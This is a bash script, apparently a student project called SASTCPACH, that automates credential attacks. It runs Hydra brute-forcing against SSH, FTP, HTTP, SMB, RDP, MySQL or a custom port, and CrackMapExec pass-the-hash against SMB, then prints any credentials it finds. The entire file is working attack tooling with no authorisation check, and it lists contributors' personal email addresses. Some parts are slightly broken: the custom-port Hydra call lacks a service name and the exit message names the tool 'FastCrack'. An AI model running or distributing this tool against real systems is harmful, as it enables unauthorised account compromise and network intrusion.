#!/bin/bash

# Function to display colorful borders around the tool name
display_title() {
    clear
    echo -e "\e[1;31m"  # Red border
    echo "##############################################################################"
    echo "######                              SASTCPACH                           ######"
    echo "##############################################################################"
    echo -e "\e[1;32m"  # Green title
    echo " ███████╗ █████╗ ███████╗████████╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗"
    echo " ██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║"
    echo " ███████╗███████║███████╗   ██║   ██║     ██████╔╝███████║██║     ███████║"
    echo " ╚════██║██╔══██║╚════██║   ██║   ██║     ██╔═══╝ ██╔══██║██║     ██╔══██║"
    echo " ███████║██║  ██║███████║   ██║   ╚██████╗██║     ██║  ██║╚██████╗██║  ██║"
    echo " ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
    echo -e "\e[1;31m"  # Red border
    echo "##############################################################################"
    echo "######                          BRUTEFORCE TOOL                         ######"
    echo "##############################################################################"
    echo -e "\e[0m"  # Reset color
    echo
}

# Function to display contributors information in a colorful table
display_contributors() {
    echo -e "\e[36m"  # Set cyan color for the contributors
    echo "Contributors:"
    echo -e "\e[34m+-----------------------------+------------------------------+"
    echo -e "| \e[36mName                         \e[34m| \e[36mEmail                       \e[34m|"
    echo "+-----------------------------+------------------------------+"
    echo -e "| Yash Pawar                   | yashpawar1199@gmail.com     |"
    echo -e "| Siddhanth Gaikwad            | siddhanthgaikwad7@gmail.com |"
    echo -e "| Om Navale                    | omnavale930@gmail.com       |"
    echo "+-----------------------------+------------------------------+"
    echo -e "\e[0m"  # Reset color
    echo
}

# Function to display tool description
display_info() {
    echo -e "\e[33m"  # Set yellow color for the description
    echo "SASTCPACH is an automated brute-forcing tool integrating Hydra and CrackMapExec."
    echo "It supports brute-forcing on websites, servers, and various services like SMB, SSH, RDP, SQL, and custom ports."
    echo -e "\e[0m"
}

# Function to list available wordlists and select one
list_wordlists() {
    echo -e "\e[1;34mAvailable wordlists in /usr/share/wordlists:\e[0m"
    local wordlist_dir="/usr/share/wordlists"
    select wordlist in $(ls "$wordlist_dir"); do
        if [ -n "$wordlist" ]; then
            echo "$wordlist_dir/$wordlist"
            break
        else
            echo "Invalid selection, please try again."
        fi
    done
}

# Function to select wordlist for both usernames and passwords
select_wordlists() {
    echo "Select a wordlist for usernames:"
    user_wordlist=$(list_wordlists)

    echo "Select a wordlist for passwords:"
    pass_wordlist=$(list_wordlists)

    echo -e "\e[32mUsing username wordlist: $user_wordlist\e[0m"
    echo -e "\e[32mUsing password wordlist: $pass_wordlist\e[0m"
}

# Function to run hydra brute-force attack for multiple services
run_hydra() {
    read -p "Enter target IP or domain: " target
    echo -e "\e[1;34mChoose the service you want to attack:\e[0m"
    echo "1) SSH"
    echo "2) FTP"
    echo "3) HTTP/HTTPS"
    echo "4) SMB"
    echo "5) RDP"
    echo "6) SQL"
    echo "7) Custom Port"
    read -p "Enter your choice (1-7): " service_choice

    case $service_choice in
        1) service="ssh" ;;
        2) service="ftp" ;;
        3) service="http" ;;
        4) service="smb" ;;
        5) service="rdp" ;;
        6) service="mysql" ;;  # For SQL login, we assume MySQL; adjust as needed
        7) read -p "Enter custom port: " custom_port
           service=$custom_port ;;
        *) echo "Invalid choice, exiting." 
           exit 1 ;;
    esac

    echo -e "\e[35mStarting Hydra brute-force on $service at $target...\e[0m"
    if [ "$service" = "$custom_port" ]; then
        hydra -L "$user_wordlist" -P "$pass_wordlist" -s "$custom_port" "$target" | tee hydra_output.txt
    else
        hydra -L "$user_wordlist" -P "$pass_wordlist" "$target" "$service" | tee hydra_output.txt
    fi

    # Show credentials found
    echo -e "\e[32mHydra attack completed.\e[0m"
    echo -e "\e[33mCredentials found:\e[0m"
    grep "login:" hydra_output.txt
}

# Function to run crackmapexec pass-the-hash attack
run_crackmapexec() {
    read -p "Enter target IP: " target_ip
    read -p "Enter username: " username
    read -p "Enter NTLM hash: " ntlm_hash

    echo -e "\e[35mStarting CrackMapExec pass-the-hash attack...\e[0m"
    crackmapexec smb "$target_ip" -u "$username" -H "$ntlm_hash" | tee cme_output.txt

    # Show credentials found
    echo -e "\e[32mCrackMapExec attack completed.\e[0m"
    echo -e "\e[33mCredentials found:\e[0m"
    grep -i "pwned" cme_output.txt
}

# Function to save output to a file
save_output() {
    read -p "Do you want to save the output to a file? (y/n): " save_choice
    if [ "$save_choice" = "y" ]; then
        read -p "Enter filename to save the results: " filename
        echo "Saving results to $filename..."
        cat hydra_output.txt cme_output.txt > "$filename" 2>/dev/null
        echo -e "\e[32mResults saved to $filename.\e[0m"
    else
        echo -e "\e[31mResults will not be saved.\e[0m"
    fi
}

# Main menu for the tool
main_menu() {
    while true; do
        echo -e "\e[1;34mChoose an action:\e[0m"
        echo -e "\e[36m1) Brute-force using Hydra"
        echo "2) Pass-the-hash attack using CrackMapExec"
        echo "3) Exit\e[0m"
        read -p "Enter your choice (1-3): " action

        case $action in
            1)
                select_wordlists
                run_hydra
                save_output
                ;;
            2)
                run_crackmapexec
                save_output
                ;;
            3)
                echo -e "\e[31mExiting FastCrack. Goodbye!\e[0m"
                exit 0
                ;;
            *)
                echo -e "\e[31mInvalid choice. Please try again.\e[0m"
                ;;
        esac
    done
}

# Display initial information
display_title
display_contributors
display_info

# Launch the main menu
main_menu
